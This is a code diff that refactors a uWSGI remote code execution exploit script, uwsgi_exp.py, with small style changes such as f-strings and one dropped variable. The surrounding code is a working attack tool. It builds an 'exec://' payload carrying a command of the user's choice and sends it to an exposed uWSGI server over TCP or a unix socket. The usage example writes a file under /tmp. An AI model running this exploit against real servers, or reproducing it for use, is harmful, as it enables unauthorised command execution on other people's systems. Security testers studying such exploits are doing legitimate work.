@@ -23,8 +23,7 @@ def pack_uwsgi_vars(var):
     pk = b''
     for k, v in var.items() if hasattr(var, 'items') else var:
         pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
-    result = b'\x00' + sz(pk) + b'\x00' + pk
-    return result
+    return b'\x00' + sz(pk) + b'\x00' + pk
 
 
 def parse_addr(addr, default_port=None):
@@ -44,12 +43,12 @@ def get_host_from_url(url):
     if '//' in url:
         url = url.split('//', 1)[1]
     host, _, url = url.partition('/')
-    return (host, '/' + url)
+    return host, f'/{url}'
 
 
 def fetch_data(uri, payload=None, body=None):
     if 'http' not in uri:
-        uri = 'http://' + uri
+        uri = f'http://{uri}'
     s = requests.Session()
     # s.headers['UWSGI_FILE'] = payload
     if body:
@@ -115,7 +114,7 @@ def main(*args):
     Last modifid at 2018-01-30 by wofeiwo@80sec.com
     """
     elog = "Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111>/tmp/abc\""
-    
+
     parser = argparse.ArgumentParser(description=desc, epilog=elog)
 
     parser.add_argument('-m', '--mode', nargs='?', default='tcp',
@@ -137,7 +136,7 @@ def main(*args):
     if args.mode.lower() == "http":
         print("[-]Currently only tcp/unix method is supported in RCE exploit.")
         return
-    payload = 'exec://' + args.command + "; echo test" # must have someting in output or the uWSGI crashs.
+    payload = f'exec://{args.command}; echo test'
     print("[*]Sending payload.")
     print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
 
